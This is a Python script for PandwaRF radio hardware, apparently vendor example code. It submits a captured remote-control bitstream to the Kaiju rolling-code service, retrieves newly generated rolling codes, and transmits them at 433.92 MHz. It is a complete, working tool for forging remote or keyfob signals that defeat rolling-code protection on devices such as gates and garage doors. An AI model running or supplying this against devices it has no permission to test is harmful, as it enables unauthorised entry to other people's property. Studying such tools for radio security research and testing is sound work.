import json
from rflib.chipcon_gollum import *
import time, requests

if __name__ == "__main__":
    d = PandwaRF()
    FREQ = 433_920_000
    DATARATE = 2_500
    # Your token can be found on https://rolling.pandwarf.com/profile-user
    # It is the 'API token'
    KAIJU_API_TOKEN = "YOUR_KAIJU_API_TOKEN_HERE"
    ROLLING_INFO = {
        "numCodesRequested": 2,
        "rxTxConfig": {
            "rawBitStream": "10101010101010101010101000000000001101001001001001001001101101101001001001101001001101101001101101101001101101101001101001001101101101001001001101101101101001001001101001101101101001101101101101101001101101101101101101001101101101"
        }
    }
    # We will generate 2 rolling codes and send them using the PandwaRF
    base_url = "https://rolling.pandwarf.com/api/v1"
    s = requests.Session()
    s.headers.update({
        'Authorization': f'Token {KAIJU_API_TOKEN}'
    })

    payload = json.dumps(ROLLING_INFO)
    print("Asking Kaiju for rolling codes")
    response = s.post(f"{base_url}/generate/capture", data=payload)
    result = response.json()
    if "progress" not in result.keys():
        print(json.dumps(result, indent=2))
        d.setModeIDLE()
        exit()
    # Now polling server every 1 seconds until processing is finished
    progress = result["progress"]
    taskId = result["id"]
    while progress != 100:
        r = s.get(f"{base_url}/task/{taskId}")
        result = r.json()
        progress = result["progress"]
        print(f"Progress: {progress}/100")
        time.sleep(1)

    print("Processing done, now retrieving the rolling codes :")
    r = s.get(f"{base_url}/remote/{taskId}")
    result = r.json()

    rollingCodes = result["remoteData"]["rollingCodes"]

    print("Preparing PandwaRF for TX")
    d.setModeIDLE()
    d.txSetup(FREQ, MOD_ASK_OOK, DATARATE)
    d.setAmpMode(RF_TX_POWER_AMPLIFIER_ACTION_ON)
    d.setModeTX()

    for rollingCode in rollingCodes:
        syncCounter = rollingCode["syncCounter"]
        button = rollingCode["button"]
        dataHex = rollingCode["dataHex"]
        fullMsgHex = rollingCode["fullMsgHex"]
        data = dataHex
        if not data:
            data = fullMsgHex
        
        data = bytes.fromhex(data)
        print(f"Sending rolling code {syncCounter} of button {button}")
        d.RFxmit(data)
        time.sleep(2)
    
    if rollingCodes == []:
        print("Unable to generate rolling code")

    d.setModeIDLE()
